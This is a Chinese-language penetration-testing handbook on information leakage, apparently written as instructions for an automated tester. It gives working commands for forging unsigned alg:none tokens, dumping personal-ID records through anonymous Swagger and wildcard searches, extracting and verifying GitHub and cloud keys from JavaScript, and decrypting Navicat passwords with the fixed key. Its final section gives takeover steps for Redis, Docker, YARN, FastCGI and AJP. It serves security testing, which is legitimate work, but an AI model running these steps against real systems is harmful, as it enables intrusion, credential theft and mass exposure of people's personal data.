> 写不写只认 `rules/vuln-report-format.md`。本篇测：版本/框架/health/无账密壳/指纹 → 继续挖完整账密、密钥、跨主体业务数据。抄到账密/云密钥/token：须假值对照，认钥枪带出身份或列表，再打不影响线上的只读例才交；手机号加解密钥不写。
> 结构：本篇较短，可整篇开。中间件端口见了再打（§五），不是每站先扫端口。

# 信息泄露测试手册

## 一、常见泄露点

### 1.1 接口响应字段过多

```bash
# 测试登录/用户信息接口是否返回敏感字段
curl "https://target.com/api/user/info" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 关注字段:
# password, passwordHash, salt
# idCard, bankCard, realName
# phone (未脱敏), email
# secretKey, apiKey, token
# internal fields: is_admin, role, balance_internal
```

### 1.2 错误信息泄露

```bash
# 发送畸形请求触发错误
curl "https://target.com/api/user?id='"
curl "https://target.com/api/user?id[]=1"

# 关注响应中:
# 数据库报错（SQL语句暴露）
# Stack trace（代码路径暴露）
# 内网 IP 地址
# 框架/版本信息
```

---

## 二、文件/目录泄露

### 2.1 常见敏感路径

```bash
# 开发遗留文件
/.git/config
/.git/HEAD
/.svn/entries
/.DS_Store
/.env
/.env.local
/.env.production
/config.php
/config.yml
/application.properties
/application.yml
/web.config

# 备份文件
/index.php.bak
/index.php~
/backup.zip
/backup.tar.gz
/www.zip
/site.tar.gz
/db.sql
/database.sql

# API 文档（可能泄露接口列表）
/swagger-ui.html
/api-docs
/v2/api-docs
/swagger.json
/openapi.json
/doc.html
/redoc

# 监控/运维端点
/actuator
/actuator/env
/actuator/mappings
/actuator/beans
/metrics
/health
/info
```

### 2.2 自动扫描

```bash
# ffuf 批量检测
ffuf -u "https://target.com/FUZZ" \
  -w sensitive_paths.txt \
  -mc 200,301,302,403 \
  -t 30 -o leaks.json -of json

# 从 ffuf 结果过滤 403（可能有内容但被拦截，值得深入）
cat leaks.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for r in data['results']:
    print(f\"{r['status']} {r['url']} ({r['length']} bytes)\")
"
```

### 2.3 门户 SPA 指向的独立 API 主机：匿名 Swagger + external 前缀

企业对外注册 / 供应商 / 客户门户的常见形态：前端在 `main.<hash>.js` 里把 `API_URL` 写死到**另一个**主机（`xxx-api.target.com`），该主机自带 `/swagger/v1/swagger.json`；文档把 `Bearer` 声明成全局鉴权，但为对外注册流程单开的 `external` / `public` / `portal` / `*WithoutCheck` 前缀路由**实际不校验**。

做法：不登录先拉 Swagger（常常 200，几百 KB），从 `paths` 里挑带 `external` / `public` / `portal` / `withoutcheck` / `anonymous` 的 GET/POST，按它自己的路径格式填占位值（税号位数、车牌、GUID），再看回包是不是业务主数据。

```bash
curl -s "https://xxx-api.target.com/swagger/v1/swagger.json" -o sw.json
python3 - <<'PY'
import json
d = json.load(open("sw.json"))
for p, ms in d["paths"].items():
    if any(k in p.lower() for k in ("external","public","portal","withoutcheck","anonymous")):
        for m, o in ms.items():
            if m in ("get","post"):
                print(m.upper(), p, o.get("tags"))
PY
```

判据：匿名回包直接给业务主数据（姓名 + 证件号 + 地址、车牌 + 车主公司 CNPJ + 内部伙伴编码、内部 SAP/ERP 报文）。只回 `{}`、只回 true/false、或全局 Bearer 对每个口都生效 → 不是这条。

**别用「错误长度的输入回 400」当精确匹配的证据。** 路径参数真正叫什么要看 Swagger：参数名叫 `term` / `q` / `search` 的，就是检索词不是主键。这类口一旦接受单字符，等于不需要任何已知证件号就能换回一批真人（实测单字符回 192 条含 CPF + 姓名 + 街道）。两个必然踩的坑：

- 拿 `111`、某个单词去查回 400，就以为它做了长度或格式校验 → 错，那是「命中范围过宽」的拒绝。换成更窄的数字串（`70`、`9999`）就出数，按数字逐层切分能把整表捞完，这比「按已知证件号精确反查」严重一档。
- 只拿一个不存在的值回 204 就写「精确匹配」→ 错，204 只证明那一个值不在库里，不证明参数是主键。真正的对照是**输入一个明显不是证件的串**（如 `88888888888` 这类占位号）看它是否仍然回一批记录。

### 2.4 OData 后端按载荷属性下标取身份、且不验签

企业供应商/客户门户的第二种常见形态：前端是 AngularJS/Kendo 一类的 SPA，后端是 ASP.NET WebAPI OData（路径以 `/xxx/oData/` 结尾），旁边另有一个 `/sts/` 服务发令牌。这类站的回包很诚实，顺着报错就能把鉴权结构摸出来。

摸的顺序：

1. 拉 Swagger 或 `/<前缀>/oData/$metadata`（常常 200，几十 KB），拿到全部实体集名和字段。`$metadata` 开、实体集却 401/406 是常态，别在这里停。
2. 直接 GET 一个实体集，看 500 的 `innererror.message`。常见三种：
   - `Value cannot be null. Parameter name: values` + `String.Join` → 安全头过滤器在读某个请求头，缺了直接崩。
   - 一段纯文本 `... - cookieToken <值> - token <值>` → 双提交 XSRF，只要 `X-XSRF-TOKEN` 头等于 `XSRF-TOKEN` Cookie 就过；这类值常常由 `/sts/cookie` 一类的口免登录下发，而且**每次都是同一个固定值**（不绑会话）。
   - `Index was out of range ... at List`1.get_Item(Int32 index)` → 代码在按**下标**取 token 载荷里的属性。
3. `Authorization: Bearer abc` 回 `Index was outside the bounds of the array` → 它按 `.` 切 token 且不验签。此时逐个试载荷属性个数：5 个 500、6 个 200，就是 `Properties().ToList()[5]`。
4. 造令牌：header `{"alg":"none"}`、payload 六个属性、第三段随便一个字符。GET 实体集，配 `$count=true` 看总量。

先拿双提交值，再造令牌，再打实体集：

```bash
curl -s -D - -o /dev/null https://TARGET/sts/cookie | grep -i '^set-cookie: XSRF-TOKEN'
python3 -c 'import base64,json;b=lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=");print(b({"alg":"none"})+"."+b({"a":"x","b":"x","c":"x","d":"x","e":"x","f":"00000000000"})+".x")'
curl -s -H "Cookie: XSRF-TOKEN=$XS" -H "X-XSRF-TOKEN: $XS" -H "Authorization: Bearer $TOK" \
     "https://TARGET/xxx/oData/Fornecedor?\$top=1&\$count=true"
```

判据：实体集整表返回——`@odata.count` 上万、单次响应到 MB 级，且带他方业务数据或个人证件号；并且三组对照齐全：去掉 Authorization 回 500、载荷少一个属性回 500、满属性回 200。第六个属性换成别的值（`0` / 真实证件号 / `x`）仍返回同一张表，说明服务端只是把它当身份取出来，从没拿去过滤。

假点：实体集恒定 406/401（另有一层真鉴权，`$metadata` 开不算）；令牌里的身份确实被拿去过滤、只回自己那一条；或者拿不到任何能免登录下发的 XSRF 值。

---

## 三、JS 文件信息泄露

```bash
# 从 JS 文件中提取敏感信息
# 下载所有 JS 后搜索:
grep -rE "(apiKey|api_key|secret|password|token|ak|sk)\s*[=:]\s*['\"][^'\"]{8,}" *.js

# AK/SK 泄露（云服务凭证）
grep -E "AKID[A-Za-z0-9]{16,}" *.js       # 云厂商 AK 前缀
grep -E "LTAI[A-Za-z0-9]{16,}" *.js       # 云厂商 AK 前缀
grep -E "AKIA[A-Za-z0-9]{16,}" *.js       # AWS
grep -E "[a-zA-Z0-9+/]{40}=" *.js         # 疑似 Base64 密钥

# GitHub PAT（文档/社区站常把贡献者插件的钥打进 bundle）
grep -oE "ghp_[A-Za-z0-9]{20,}" *.js
grep -oE "github_pat_[A-Za-z0-9_]{20,}" *.js

```

### 3.1 文档站 GitHub PAT

开源文档/社区前端为拉 GitHub org、贡献者、star 把头，常把 `ghp_` / `github_pat_` 打进打包 JS。

不登录从 JS 抄出来：

```bash
curl -s "https://api.github.com/user" -H "Authorization: token $PAT"
# 对照：不带头应 401
curl -s "https://api.github.com/user/repos?affiliation=owner&per_page=5" -H "Authorization: token $PAT"
```

算成：带 PAT 的 `/user` 返回对应身份、无凭据对照失败，证明令牌被认可；影响只写该令牌实际允许的操作/资源。仓库 `permissions.admin=true` 是账号的仓库角色，不能推出该 PAT 有写仓/管理权限或完整账号控制。classic PAT 的 scope 头可辅助核对，fine-grained PAT 要看其资源/权限限制；能力用范围内最小只读请求证明，未测写入不宣称可写。

假点：钥已吊销；`/user` 401；只是 GitHub App 安装令牌读公开 org。密钥实值只进正式报告，不进本篇。

### viewer JS XOR 藏对象存储永久钥（短表有指针）

认：落地页/viewer JS 有 `usePrivateCode`（或同类函数名），`COS_TOKEN` 的 SECRET_ID/SECRET_KEY 不是明文 AKID。编码：前 16 个字符当循环 XOR 钥匙，后面一段 hex 解开才是永久 AK/SK。只 grep `AKID` 会当没钥。

打（不登录）：解开后签 `云 STS 接口` **GetCallerIdentity**，再 `云 CAM 接口` **GetUserAppId**。ListBuckets 403 别停。

算成：问出 AccountId/Uin/AppId。长期钥，不是几分钟过期的临时票。

假点：解开调云 API AuthFailure；`exampleValue` 解成 `hello_world` 占位。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

### 管理台 JS 写死 CI 仓钥（短表有指针）

认：管理台前端 JS 写死 CI 的 `pipelineId` + base64 `auth`，且有未登录 trigger 口。

打（不登录）：抄 auth 调 `Git 托管开放接口` open-api `DescribeMyDepots`；本站 trigger 只作对照。

算成：列出他团队私有仓库名/HttpsUrl/ProjectId，或钥 scope 含 `depot_read` 且开放接口认钥。

假点：钥过期；仓是公开的；只有 trigger 回产品下线、没有证明钥还能列出私仓。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

### 文档 chunk 里的真实证件样例（短表有指针）

认：开放平台文档中心；页面文档/分类口 401；入口 script 有 DocPage 动态 `import()` 的 `technical-document`（或同类文档 chunk）。不是「调试文档写死 AppSecret」那一行。

打（不登录）：文档 API 401 别停。跟首页 script → DocPage `import()` → 文档 chunk。抠样例请求/响应报文里的身份证、手机、姓名。过校验位才往下。

算成：过校验位的身份证 + 姓名/手机，对得上人。

假点：张三/110101 占位；校验位不对的编造号；空 `appliIdNo` 模板；只有公开产品说明书没有样例报文。单站没中不删短表这行。证件实值只进正式报告。

### 匿名领签包里的连接配置（短表有指针）

认：企业软件中心人打开是登录页；另有领对象存储带签口不要 Cookie；或同站 `/download/`+软件文件名不要 Cookie；压缩包里是 Navicat `ncx`（连接名、Host、账号、`SavePassword` 密文）。首页 302 去登录墙时，**302 响应体里内联的领签函数也算入口**，别只看落地登录页。

打（不登录）：领签口把带签 URL 拿出来，Range GET 真 zip。**领签没有/要登录别停**：302 体或首页软件列表里的文件名，同站 `GET /download/{文件名}` 直下（乱填文件名常 302 回首页，对上名字才 200）。解出 `*.ncx`。Password 用 Navicat 12 固定钥匙 `libcckeylibcckey`、IV `libcciv libcciv` 做 AES-128-CBC，去掉 PKCS7。

算成：内网库 Host+账号+明文密。密钥实值只进正式报告。

假点：包里只有公开客户端没有连接配置；密文解不开。单站没中不删短表这行。

### 分布式文件 master 未授权用户钥（短表有指针）

认：公网 HTTP `/version` 出 `"Model":"master"`（分布式文件集群）。管理口不要登录。

打（不登录）：

1. `GET /user/list` 拿 `access_key`+`secret_key`
2. 对照：假 16 位 ak 打 `GET /user/akInfo?ak=` 应 `access key not exists`；实际 ak 问出 `user_id`/user_type。这是 AK 到账号的查询，未用 SK，不能认定密钥对有效
3. `GET /admin/getVol?name=` 看范围内业务卷（Owner / InodeCount）；匿名查询成功单独证明元数据暴露，不证明使用了该 AK/SK
4. 验证密钥对时，按该产品实际签名协议用 AK/SK 签一个范围内只读请求；同请求对照错误 SK/无签名，确认服务端确实校验签名及实际允许的资源。缺少签名接口/验证条件时保留 SK 有效性未验证

算成：分别记录完整凭证字段泄露、匿名用户/卷信息暴露；只有正确签名成功且错误 SK/无签名被拒，才确认该密钥对在该接口有效，不外推其它权限。

假点：只出版本/集群名、list 空或字段是占位值。真假 SK 结果相同不能确认签名认证；卷为空不否定已观察的凭证字段泄露，但业务数据影响未证。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

```bash
# 内网地址泄露
grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}" *.js
```

---

## 四、特殊接口泄露

### 4.1 分页接口越界

```bash
# 大页码获取全量数据
?page=99999&pageSize=1000
?offset=0&limit=99999

# 导出接口未限制数量
/api/export/users?format=csv
/api/export/orders?startTime=2020-01-01&endTime=2026-01-01
```

### 4.2 搜索接口通配符

```bash
# 模糊搜索获取全量数据
?keyword=%         # URL 编码的 %，SQL LIKE 通配符
?keyword=*
?keyword=.         # 部分系统
?q=               # 空搜索返回所有
```

### 4.3 GraphQL 自省

```bash
# GraphQL 接口泄露 schema
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# 如果返回完整 schema → 可能泄露未公开的接口和字段
```

---

## 五、中间件端口见了怎么打

> **见了才打。** 不是每站先 nmap 全端口。FOFA/进站/响应头已经露出这些端口或控制台，再按表走。打穿了按 `vuln-report-format` 落盘；health/版本壳继续跟账密，不要停在 PONG。

| 见什么 | 打哪 | 出什么算成 | 假点 / 转哪 |
|--------|------|------------|-------------|
| `:6379` Redis，无密码 `PING`→`PONG` | 写 webshell / crontab / `authorized_keys`（目录得是真 web 根或 cron）。SSRF 走到这口用 `gopher://`，见 `ssrf-test.md` | 命令跑起来，或读到业务库 | 有 `requirepass`；`CONFIG` 被 rename；只能 `PING` |
| `:873` rsync 匿名 `rsync host::` 列出模块 | 下业务文件；模块可写再看能否写 cron | 拉到密钥/业务数据 | 空模块；只读且全是公开静态 |
| `:9000` PHP-FPM/FastCGI 直接暴露 | FastCGI 包打已有 `.php`（`PHP_VALUE=auto_prepend_file=php://input`）。SSRF 用 gopherus fastcgi | 指定 PHP 被执行 | 只 Unix socket、外网 9000 不是 FPM |
| `:8009` AJP | Ghostcat 读 `/WEB-INF/web.xml`。见 `path-traversal-lfi-test.md` §21 | 读到 web.xml / class | `secretRequired`；端口不是 AJP |
| `:8088` Hadoop YARN UI | `POST /ws/v1/cluster/apps/new-application` 再提交带 `commands` 的 app | 集群里跑了你的命令 | 只要 UI 登录墙；提交 401 |
| `:2375` Docker API | `GET /v1.24/containers/json`；能 create 再挂 `/:/host` | 列出容器或读到宿主机文件 | TLS 2376 无客户端证；只 version |
| `/h2-console` | JDBC URL JNDI 或 `CREATE ALIAS`。见 `jndi-injection-test.md`「H2 Console」 | 命令跑起来 | 只本机能开 |

公网直接打和 SSRF 打内网是同一套 sink，差别只是入口。没这些端口不要为了本表去扫。
